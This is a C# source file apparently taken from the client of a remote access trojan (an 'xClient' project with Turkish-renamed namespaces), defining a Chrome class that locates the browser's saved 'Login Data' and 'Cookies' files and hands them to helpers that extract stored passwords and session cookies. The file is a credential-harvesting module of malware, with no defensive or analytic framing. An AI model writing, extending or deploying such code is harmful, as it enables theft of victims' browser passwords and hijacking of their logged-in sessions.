using System;
using System.Collections.Generic;
using System.IO;
using xClient.KuuhakuÇekirdek.Veri;
using xClient.KuuhakuÇekirdek.Kurtarma.Utilities;

namespace xClient.KuuhakuÇekirdek.Kurtarma.Tarayıcılar
{
    public class Chrome
    {
        public static List<KurtarılanHesaplar> GetSavedPasswords()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Login Data");
                return ChromiumBase.Passwords(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<KurtarılanHesaplar>();
            }
        }

        public static List<ChromiumBase.ChromiumCookie> GetSavedCookies()
        {
            try
            {
                string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google\\Chrome\\User Data\\Default\\Cookies");
                return ChromiumBase.Cookies(datapath, "Chrome");
            }
            catch (Exception)
            {
                return new List<ChromiumBase.ChromiumCookie>();
            }
        }
    }
}